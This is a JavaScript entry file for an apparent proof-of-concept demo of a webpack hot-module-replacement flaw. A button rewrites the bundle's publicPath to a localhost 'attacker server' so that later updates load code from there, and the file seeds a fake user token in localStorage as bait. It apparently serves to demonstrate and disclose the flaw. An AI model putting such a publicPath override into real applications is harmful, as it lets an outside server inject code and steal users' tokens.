import { displayMessage } from './module.js';

// Initialize app
const app = document.getElementById('app');
displayMessage(app);

// Add attack demo button
const attackButton = document.createElement('button');
attackButton.textContent = 'Inject Malicious publicPath';
attackButton.style.cssText = 'background: red; color: white; padding: 10px; margin: 20px 0; cursor: pointer;';
attackButton.onclick = () => {
  // Change publicPath to attacker's server
  __webpack_require__.p = 'http://localhost:3333/';
  
  console.log('⚠️ publicPath changed to:', __webpack_require__.p);
  alert('publicPath has been changed to attacker server!\nNow edit src/module.js to trigger HMR update.');
  
  // Update status display
  document.getElementById('current-publicpath').textContent = __webpack_require__.p;
};

document.body.insertBefore(attackButton, app);

// Display current status
const statusDiv = document.createElement('div');
statusDiv.innerHTML = `
  <h3>Current Status:</h3>
  <p>publicPath: <code id="current-publicpath">${__webpack_require__.p}</code></p>
  <p>HMR enabled: <code>${module.hot ? 'Yes' : 'No'}</code></p>
`;
statusDiv.style.cssText = 'background: #f0f0f0; padding: 10px; margin: 20px 0;';
document.body.insertBefore(statusDiv, app);

// Simulate user data
localStorage.setItem('userToken', 'secret-token-12345');
localStorage.setItem('userData', JSON.stringify({
  username: 'demo-user',
  email: 'user@example.com'
}));

// HMR setup
if (module.hot) {
  module.hot.accept('./module.js', () => {
    console.log('Module updated via HMR');
    import('./module.js').then(newModule => {
      newModule.displayMessage(app);
    });
  });
}